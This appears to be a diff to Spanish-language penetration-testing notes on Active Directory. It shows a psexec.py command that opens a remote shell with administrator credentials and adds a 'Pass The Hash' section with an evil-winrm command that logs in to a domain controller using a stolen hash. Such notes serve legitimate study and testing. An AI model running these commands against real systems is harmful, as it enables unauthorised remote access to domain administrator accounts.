@@ -10,6 +10,8 @@ Ejemplo:
 ```
 psexec.py wizzz.local/Administrador:Passw0rd@192.168.45.130 cmd.exe
 ```
+
+# Pass The Hash
 También podemos ganar acceso si hemos conseguido su `hash` mediante `evil-winrm`
 ```
 evil-winrm -i <ip-DC> -u '<Administrator>' -H '<hash>'
